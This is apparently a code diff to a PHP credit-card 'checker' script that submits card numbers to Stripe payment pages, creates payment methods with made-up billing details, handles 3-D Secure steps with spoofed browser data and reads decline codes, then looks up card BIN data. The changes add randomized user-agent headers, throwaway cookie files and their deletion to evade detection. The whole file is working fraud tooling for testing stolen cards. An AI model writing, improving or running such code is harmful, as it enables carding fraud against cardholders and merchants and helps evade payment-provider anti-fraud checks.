@@ -22,6 +22,32 @@ $regionId   = $a->hello->street->regionId ?? "12";
 $country    = $a->hello->street->country ?? "United States";
 $fivenums   = rand(1000, 9999); // Generate 5 random numbers
 
+//SET YOUR RANDOM HEADERS
+$headers = array(
+    'User-Agent: ' => array(
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' Edge/16.16299',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' SE 2.X MetaSr 1.0',
+  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' SE 2.X MetaSr 1.0',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' OPR/45.0.2552.635',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' OPR/45.0.2552.635',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' Vivaldi/1.9.818.44',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' Vivaldi/1.9.818.44',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).'',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/'.rand(11,99).'.'.rand(11,99).'; AS; rv:'.rand(11,99).'.'.rand(11,99).') like Gecko',
+  'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/'.rand(11,99).'.'.rand(11,99).'; AS; rv:'.rand(11,99).'.'.rand(11,99).') like Gecko'
+),
+    // add more headers here
+);
+
+$randomHeaders = array();
+
+// SET YOUR COOKIES
+if (!is_dir("cookies")) {
+    mkdir("cookies");
+}
+$gon = getcwd() . DIRECTORY_SEPARATOR . "cookies" . DIRECTORY_SEPARATOR . "jungkookie" . rand(10000, 9999999) . ".txt";
+$cookietempfile = fopen($gon, 'w+');
+fclose($cookietempfile);
 
 //================ [ FUNCTIONS & LISTA ] ===============//
 
@@ -105,9 +131,8 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive
 curl_setopt($ch, CURLOPT_POST, 1);
 $postfield = 'eid=NA&consent[terms_of_service]=accepted&key='.$pklive.'';
 
-$headers = array();
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
-curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
+curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
 $curl2 = curl_exec($ch);
 curl_close($ch);
 
@@ -124,9 +149,8 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($ch, CURLOPT_POST, 1);
 $postfield = 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$full_name.'&billing_details[email]='.$xemail.'&billing_details[address][country]=US&billing_details[address][line1]='.$street.'&billing_details[address][city]='.$city.'&billing_details[address][postal_code]='.$zip.'&billing_details[address][state]='.$state.'&guid=e3180ce0-937d-41a5-a49b-34554202be6396cd52&muid=91670c3f-fc9d-417a-ad5b-55b56e3858e828a431&sid=f2b8e6cd-0795-4bcf-8439-b74dd87132b090531f&key='.$pklive.'&payment_user_agent=stripe.js%2F18b0f5a540%3B+stripe-js-v3%2F18b0f5a540%3B+checkout';
 
-$headers = array();
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
-curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
+curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
   $curl0 = curl_exec($ch);
 curl_close($ch);
 
@@ -149,9 +173,8 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive
 curl_setopt($ch, CURLOPT_POST, 1);
 $postfield = 'eid=NA&payment_method='.$pm.'&expected_amount='.$xamount.'&last_displayed_line_item_group_details[subtotal]='.$xamount.'&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key='.$pklive.'';
 
-$headers = array();
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
-curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
+curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
  $curl1 = curl_exec($ch);
 curl_close($ch);
 
@@ -205,10 +228,9 @@ for ($i = 0; $i < 10; $i++) {
 // Now you can use $randomUserAgents array in your postfield
 $postfield = 'source='.$three_d_secure_2_source.'&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22873%22%2C%22browserScreenWidth%22%3A%22393%22%2C%22browserTZ%22%3A%22-480%22%2C%22browserUserAgent%22%3A%22'.$randomUserAgent.'%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key='.$pklive.'';
 
-$headers = array();
 
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
-curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
+curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
  $result = curl_exec($ch);
 curl_close($ch);
 
@@ -226,10 +248,8 @@ if (!empty($proxy)) {
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'?key='.$pklive.'&is_stripe_sdk=false&client_secret='.$client_secret.'');
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
 
-$headers = array();
-
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
-curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
+curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
 $result1 = curl_exec($ch);
 curl_close($ch);
 
@@ -246,16 +266,25 @@ $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'?key='.$pklive.'&eid=NA');
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
 
-$headers = array();
-
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
-curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
+curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
 $result2 = curl_exec($ch);
 curl_close($ch);
 
 $result2;
 $dcode2 = json_decode($result2)->last_payment_error->decline_code;
 $currency = json_decode($result2)->currency;
+
+// DELETE COOKIES
+if (is_file($gon) && is_writable($gon)) {
+    unlink($gon);
+}
+
+// WELL IF MARAMING TXT FILE SA COOKIES FOLDER, WOOSHOO THEM!!
+$cookieFiles = glob(getcwd() . DIRECTORY_SEPARATOR . "cookies" . DIRECTORY_SEPARATOR . "jungkookie*.txt");
+foreach ($cookieFiles as $cookieFile) {
+    unlink($cookieFile);
+}
 
 //* Start of getting BIN Information *//
 
